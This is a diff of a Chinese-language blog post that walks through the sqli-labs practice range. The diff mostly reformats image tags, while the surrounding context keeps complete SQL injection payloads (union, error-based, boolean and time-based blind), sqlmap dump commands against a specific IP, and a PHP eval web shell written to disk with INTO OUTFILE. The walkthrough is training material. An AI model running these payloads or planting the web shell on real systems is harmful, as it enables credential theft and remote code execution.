@@ -78,7 +78,7 @@
 <meta property="og:image" content="https://echozt.github.io/posts/bb32/22_2.png">
 <meta property="og:image" content="https://echozt.github.io/posts/bb32/22_3.png">
 <meta property="article:published_time" content="2022-04-08T15:45:48.000Z">
-<meta property="article:modified_time" content="2022-09-05T12:33:48.858Z">
+<meta property="article:modified_time" content="2024-01-16T03:19:02.457Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="Web漏洞">
@@ -348,37 +348,43 @@ id<span class="token operator">=</span>-1' union <span class="token keyword">sel
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> from information_schema.schemata--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可获取所有的数据库：</p>
-<p> <img src="/posts/bb32/1_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/1_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="1-2获取表格"><a href="#1-2获取表格" class="headerlink" title="1.2获取表格"></a>1.2获取表格</h3><h4 id="①得到单个表格"><a href="#①得到单个表格" class="headerlink" title="①得到单个表格"></a>①得到单个表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到表为emails：</p>
-<p> <img src="/posts/bb32/1_5.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/1_5.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②得到所有表格"><a href="#②得到所有表格" class="headerlink" title="②得到所有表格"></a>②得到所有表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可得到所有的表：</p>
-<p> <img src="/posts/bb32/1_6.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/1_6.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="1-3获取字段名"><a href="#1-3获取字段名" class="headerlink" title="1.3获取字段名"></a>1.3获取字段名</h3><h4 id="①获得单个字段名"><a href="#①获得单个字段名" class="headerlink" title="①获得单个字段名"></a>①获得单个字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select column_name from information_schema.columns where table_name='</span>users' limit 0,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到字段名user_id：</p>
-<p> <img src="/posts/bb32/1_7.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/1_7.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得所有字段名"><a href="#②获得所有字段名" class="headerlink" title="②获得所有字段名"></a>②获得所有字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users' --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可查到所有字段名:</p>
-<p> <img src="/posts/bb32/1_8.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/1_8.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="1-4获取表格里面的内容"><a href="#1-4获取表格里面的内容" class="headerlink" title="1.4获取表格里面的内容"></a>1.4获取表格里面的内容</h3><h4 id="①获得单个用户名和密码"><a href="#①获得单个用户名和密码" class="headerlink" title="①获得单个用户名和密码"></a>①获得单个用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> where id<span class="token operator">=</span>2--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可以得到用户名为Angelina,密码为：I-kill-you</p>
-<p> <img src="/posts/bb32/1_9.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/1_9.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得所有的用户名和密码"><a href="#②获得所有的用户名和密码" class="headerlink" title="②获得所有的用户名和密码"></a>②获得所有的用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(username,0x3a,password) from users--+
@@ -388,7 +394,8 @@ id<span class="token operator">=</span>-1<span class="token string">' union sele
 id=-1'</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 0,1<span class="token punctuation">)</span> --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可得到所有的用户名和密码。</p>
-<p> <img src="/posts/bb32/1_10.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/1_10.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>输入1’</p>
 <pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span> LIMIT 0,1'
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -460,54 +467,64 @@ id<span class="token operator">=</span>1"<span class="token punctuation">)</span
 id<span class="token operator">=</span>1' and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>发现网络延时五秒响应，可以用延时注入：</p>
-<p> <img src="/posts/bb32/5.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="（2）可以使用报错注入："><a href="#（2）可以使用报错注入：" class="headerlink" title="（2）可以使用报错注入："></a>（2）可以使用报错注入：</h3><p>输入单引号，发现出现报错信息，因此可以使用报错注入。</p>
 <h4 id="①得到库"><a href="#①得到库" class="headerlink" title="①得到库"></a>①得到库</h4><pre class="line-numbers language-bash"><code class="language-bash">可以使用这个payload：id<span class="token operator">=</span>1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>会报错显示当前库不存在这个函数，所以数据库名可以看到为security：</p>
-<p>  <img src="/posts/bb32/5_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>当然也可以直接构造payload:</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>同样得到数据库名为security：</p>
-<p>  <img src="/posts/bb32/5_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获取用户名"><a href="#②获取用户名" class="headerlink" title="②获取用户名"></a>②获取用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到数据库用户名为root@localhost：</p>
-<p>  <img src="/posts/bb32/5_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="（3）下面采用的是基于布尔型的盲注："><a href="#（3）下面采用的是基于布尔型的盲注：" class="headerlink" title="（3）下面采用的是基于布尔型的盲注："></a>（3）下面采用的是基于布尔型的盲注：</h3><h3 id="5-1获取敏感信息"><a href="#5-1获取敏感信息" class="headerlink" title="5.1获取敏感信息"></a>5.1获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">构造payload:
 
 id<span class="token operator">=</span>1<span class="token string">' and if(substr(database(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>将’a’可替换成其他字母，进行判断，如果正确会显示下图：</p>
-<p>  <img src="/posts/bb32/5_5.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_5.png" srcset="/img/loading.gif" lazyload class>
+
 <p>不正确则会显示下图：</p>
-<p>  <img src="/posts/bb32/5_6.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_6.png" srcset="/img/loading.gif" lazyload class>
+
 <p>根据对与错来判断输入字符的正确性。</p>
 <p>这里我采用抓包然后进行爆破，可得到数据库名为：security(写成大写也可以）</p>
-<p> <img src="/posts/bb32/5_7.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_7.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="5-2获取表名"><a href="#5-2获取表名" class="headerlink" title="5.2获取表名"></a>5.2获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这里同样利用burp抓包，然后对标红的两个变量进行爆破，可得到表名为emails</p>
-<p>  <img src="/posts/bb32/5_8.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_8.png" srcset="/img/loading.gif" lazyload class>
+
 <p>并且将limit 0,1改成如limit 1,1可获取其他数据库，分别为referers,uagents,users</p>
 <h3 id="5-3获取字段名"><a href="#5-3获取字段名" class="headerlink" title="5.3获取字段名"></a>5.3获取字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">' and if(substr((select column_name from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>同样用burp抓包，得到字段名为user_id：</p>
-<p>  <img src="/posts/bb32/5_9.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_9.png" srcset="/img/loading.gif" lazyload class>
+
 <p>将limit 0,1改成其他行，可获得其他列名为username,password,等等。</p>
 <h3 id="5-4获取表里面的内容"><a href="#5-4获取表里面的内容" class="headerlink" title="5.4获取表里面的内容"></a>5.4获取表里面的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">' and if(substr((select concat(username,0x3a,password) from users limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>用burp抓包，得到用户名和密码为：dumb:dumb</p>
-<p>  <img src="/posts/bb32/5_10.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/5_10.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>本关也为盲注。 通过输入单引号不报错，输入双引号报错，可推断源码中参数可能为 “$id”</p>
 <p>所以本关的解法跟Less-5一样，只需将第五关的单引号改成双引号即可。</p>
 <h2 id="Less-7文件导入注入"><a href="#Less-7文件导入注入" class="headerlink" title="Less-7文件导入注入"></a>Less-7文件导入注入</h2><p>本关是利用文件导入的方式进行注入。</p>
@@ -515,7 +532,8 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1'<span class="token punctuation">))</span> union <span class="token keyword">select</span> 1,2,3 into outfile  <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.txt"</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>虽然显示报错信息，但在路径下已经生成了1.txt</p>
-<p>  <img src="/posts/bb32/7.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/7.png" srcset="/img/loading.gif" lazyload class>
+
 <p>可以直接将一句话木马导入进去</p>
 <p>构造payload:</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">')) union select 1,2,'</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span> ' into outfile  <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php"</span>--+
@@ -523,7 +541,8 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 <p>然后可以利用工具连接。</p>
 <h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>通过测试，id=1’ or 1=1–+是显示正确的。这关跟第五关一样，可以使用基于布尔型的盲注，以及延时注入。但是不能使用报错注入。</p>
 <p>因为在源码中将将 mysql 报错的语句进行了注释。</p>
-<p>  <img src="/posts/bb32/8.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/8.png" srcset="/img/loading.gif" lazyload class>
+
 <p>其余的payload跟第五关的一样啦。</p>
 <h2 id="Less-9-基于时间的sql盲注（采用sqlmap）"><a href="#Less-9-基于时间的sql盲注（采用sqlmap）" class="headerlink" title="Less-9 基于时间的sql盲注（采用sqlmap）"></a>Less-9 基于时间的sql盲注（采用sqlmap）</h2><p>本关可采用时间延迟的注入。</p>
 <h3 id="（1）方法一："><a href="#（1）方法一：" class="headerlink" title="（1）方法一："></a>（1）方法一：</h3><p>测试：id=1’ and sleep(5)–+</p>
@@ -534,7 +553,8 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>查看网络是否延时五秒，是则说明字符正确，不是则说明错误。</p>
 <p>将标红的1依次替换，可得到数据库名为security。</p>
-<p>  <img src="/posts/bb32/9.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/9.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得表名"><a href="#②获得表名" class="headerlink" title="②获得表名"></a>②获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 http://127.0.0.1:8099/sqli/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>e',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+
@@ -546,35 +566,40 @@ http://127.0.0.1:8099/sqli/Less-9/?id<span class="token operator">=</span>1<span
 sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>sqlmap检测到为时间注入：</p>
-<p> <img src="/posts/bb32/9_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/9_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="9-2获取敏感信息"><a href="#9-2获取敏感信息" class="headerlink" title="9.2获取敏感信息"></a>9.2获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --current-user --current-db --batch
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(–current-user为获取用户，–current-db为获取数据库名， –batch表示使用自动模式，默认为y)</p>
 <p>获得当前数据库用户名为root@localhost，数据库名为：security</p>
-<p> <img src="/posts/bb32/9_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/9_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="9-3获取表"><a href="#9-3获取表" class="headerlink" title="9.3获取表"></a>9.3获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --tables -D security --batch
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(-D 指定数据库 –tables 获取表)</p>
 <p>得到表名为emails,referers,uagents,users：</p>
-<p> <img src="/posts/bb32/9_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/9_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="9-4获取字段"><a href="#9-4获取字段" class="headerlink" title="9.4获取字段"></a>9.4获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --columns -T <span class="token function">users</span> -D security --batch
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(–columns获取字段)</p>
 <p>得到字段名为id,username,password：</p>
-<p> <img src="/posts/bb32/9_5.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/9_5.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="9-5查询账号和密码"><a href="#9-5查询账号和密码" class="headerlink" title="9.5查询账号和密码"></a>9.5查询账号和密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --dump -C <span class="token string">"id,username,password"</span> -T <span class="token function">users</span> -D security --batch
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(–dump是导出数据，-C是指定查询的字段)</p>
 <p>得到账户密码为：</p>
-<p> <img src="/posts/bb32/9_6.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/9_6.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>本关跟第九关一样，只需将第九关的单引号换成双引号即可。</p>
 <h1 id="union联合注入（Less-11-Less-12-POST）"><a href="#union联合注入（Less-11-Less-12-POST）" class="headerlink" title="union联合注入（Less-11~Less-12 POST）"></a>union联合注入（Less-11~Less-12 POST）</h1><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>不能使用–+注释符,因为抓包发现加号被编码成%2B了。</p>
 <p>可以用#，减减空格（空格被编码成了+）</p>
@@ -589,13 +614,15 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>测试：1’ or 1=1#</p>
 <p>可以登录成功：</p>
-<p> <img src="/posts/bb32/11.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/11.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="11-1获取用户名"><a href="#11-1获取用户名" class="headerlink" title="11.1获取用户名"></a>11.1获取用户名</h3><p>①payload:</p>
 <p>在username的输入框输入：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>得到当前数据库用户名为root@localhost:</p>
-<p>  <img src="/posts/bb32/11_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/11_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>或者：</p>
 <p>②payload：</p>
 <p>在username的输入框输入：</p>
@@ -606,7 +633,8 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>得到数据库名为security:</p>
-<p>   <img src="/posts/bb32/11_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/11_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>通过测试，输入1”可以看到报错信息。</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"") and password=("") LIMIT 0,1'</span> at line 1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -632,18 +660,21 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">((</span>select user<span class="token punctuation">(</span><span class="token punctuation">)</span> like <span class="token string">'r%'</span><span class="token punctuation">)</span>,1,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>用burp抓包，对标红的两个变量进行测试，爆破出当前用户名为root@localhost:</p>
-<p>   <img src="/posts/bb32/13.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/13.png" srcset="/img/loading.gif" lazyload class>
+
 <p>跟第五关的基于布尔型的盲注差不多。就不重复写了。</p>
 <h3 id="（2）可以采用报错注入"><a href="#（2）可以采用报错注入" class="headerlink" title="（2）可以采用报错注入"></a>（2）可以采用报错注入</h3><h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1'<span class="token punctuation">)</span> or info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>显示出了数据库名：</p>
-<p> <img src="/posts/bb32/13_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/13_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获取当前数据库用户名："><a href="#②获取当前数据库用户名：" class="headerlink" title="②获取当前数据库用户名："></a>②获取当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到用户名：</p>
-<p>  <img src="/posts/bb32/13_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/13_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>输入1”，出现如下错误信息提示：</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"" and password="" LIMIT 0,1'</span> at line 1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -699,19 +730,23 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/bb32/17.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/17.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②猜测数据库名-2"><a href="#②猜测数据库名-2" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
 
 或者：  
 
 1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/bb32/17_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/17_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h1 id="HTTP头部插入-Less-18-Less22"><a href="#HTTP头部插入-Less-18-Less22" class="headerlink" title="HTTP头部插入(Less-18~Less22)"></a>HTTP头部插入(Less-18~Less22)</h1><h2 id="Less-18-基于错误的用户代理，头部POST注入"><a href="#Less-18-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 基于错误的用户代理，头部POST注入"></a>Less-18 基于错误的用户代理，头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<p>  <img src="/posts/bb32/18.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/18.png" srcset="/img/loading.gif" lazyload class>
+
 <p>可以抓包修改User-Agent的内容试试：</p>
 <p>将User-Agent里面的内容随便填写，可以看到显示出了我们输入的内容：</p>
-<p>  <img src="/posts/bb32/18_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/18_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>此时可以在User-Agent中构造注入语句。</p>
 <h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -721,7 +756,8 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/bb32/18_3.png" srcset="/img/loading.gif" lazyload class> </p>
+<img src="/posts/bb32/18_3.png" srcset="/img/loading.gif" lazyload class> 
+
 <h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and '</span>1
@@ -730,12 +766,15 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/bb32/18_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/18_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-19-基于头部的Referer-POST报错注入"><a href="#Less-19-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 基于头部的Referer POST报错注入"></a>Less-19 基于头部的Referer POST报错注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<p>  <img src="/posts/bb32/19.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/19.png" srcset="/img/loading.gif" lazyload class>
+
 <p>这题的思路跟第十八关差不多，只是将User-Agent换成Referer。</p>
 <p>用burp抓包，修改一下Referer的内容看看：</p>
